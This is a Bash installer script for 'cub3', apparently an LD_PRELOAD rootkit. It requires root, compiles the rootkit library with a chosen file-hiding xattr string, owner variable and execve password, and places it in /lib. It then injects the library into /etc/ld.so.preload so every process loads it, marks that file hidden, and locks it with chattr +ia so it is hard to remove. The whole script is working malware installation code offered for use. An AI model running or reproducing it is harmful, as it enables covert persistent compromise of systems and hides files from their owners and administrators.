#!/bin/bash

[ $(id -u) != 0 ] && { echo "Not root. Exiting."; exit; }

read -p "Enter your desired install directory [/lib]: "
if [ -z $REPLY ]; then
    INSTALL_DIR="/lib"
else
    INSTALL_DIR=$REPLY
fi

read -p "Enter your desired xattr magic string [DEFAULT_XATTR_STR]: "
if [ -z $REPLY ]; then
    XATTR_STR="DEFAULT_XATTR_STR"
else
    XATTR_STR=$REPLY
fi

read -p "Enter your desired owner environment variable (used to remove cub3) [DEFAULT_VAR]: "
if [ -z $REPLY ]; then
    OWNER_ENV_VAR="DEFAULT_VAR"
else
    OWNER_ENV_VAR=$REPLY
fi

read -p "Enter your desired execve password (used for dynamically hiding/unhiding files/directories) [DEFAULT_PASS]: "
if [ -z $REPLY ]; then
    EXECVE_PASS="DEFAULT_PASS"
else
    EXECVE_PASS=$REPLY
fi


[ -f /usr/bin/apt-get ] && { echo "Installing attr via apt-get"; apt-get --yes --force-yes install attr &>/dev/null; }

echo "Configuring and compiling cub3"

sed -i "s:CHANGEME0:$XATTR_STR:" config.h
sed -i "s:CHANGEME1:$OWNER_ENV_VAR:" config.h
sed -i "s:CHANGEME2:$EXECVE_PASS:" config.h

CFLAGS="-ldl"
WFLAGS="-Wall"
FFLAGS="-fomit-frame-pointer -fPIC"
gcc -std=gnu99 cub3.c -O0 $WFLAGS $FFLAGS -shared $CFLAGS -Wl,--build-id=none -o cub3.so
strip cub3.so
setfattr -n user.$XATTR_STR -v $XATTR_STR cub3.so

sed -i "s:$XATTR_STR:CHANGEME0:" config.h
sed -i "s:$OWNER_ENV_VAR:CHANGEME1:" config.h
sed -i "s:$EXECVE_PASS:CHANGEME2:" config.h

echo "cub3 successfully configured and compiled."
echo "Installing cub3.so to $INSTALL_DIR and injecting into ld.so.preload"

mv cub3.so $INSTALL_DIR/
echo "$INSTALL_DIR/cub3.so" > /etc/ld.so.preload
export $OWNER_ENV_VAR=1
setfattr -n user.$XATTR_STR -v $XATTR_STR /etc/ld.so.preload
chattr +ia /etc/ld.so.preload

echo "cub3 successfully installed on the system."
echo "Remember you can remove it by setting your environment variable ($OWNER_ENV_VAR) in a root shell and removing ld.so.preload."
echo "Remember to run chattr -ia on ld.so.preload, or else you'll be unable to remove it. :p"
